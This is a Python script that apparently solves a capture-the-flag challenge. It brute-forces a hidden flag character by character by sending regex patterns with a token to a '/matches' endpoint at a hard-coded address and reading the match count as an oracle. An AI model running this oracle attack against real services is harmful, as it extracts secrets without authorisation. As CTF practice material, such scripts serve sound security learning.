import requests

BASE_URL = "http://172.105.180.8:32769/matches"
TOKEN = "ADMIN_TOKEN"
CHARSET = "ACEFGHINRST_"
FLAG_PREFIX = "ATR{"
FLAG_SUFFIX = "}"

def test_flag(flag):
    pattern = f"{FLAG_PREFIX}{flag}{FLAG_SUFFIX}"
    response = requests.get(BASE_URL, params={"token": TOKEN, "pattern": pattern})
    return response.json().get("matches", 0) == 1

def brute_force_flag():
    flag = ""
    while True:
        for char in CHARSET:
            test_pattern = flag + char
            if test_flag(test_pattern + ".*"):
                flag += char
                print(f"Current flag: {FLAG_PREFIX}{flag}")
                break
        else:
            # No more characters match, flag is complete
            print(f"Flag found: {FLAG_PREFIX}{flag}{FLAG_SUFFIX}")
            break

if __name__ == "__main__":
    brute_force_flag()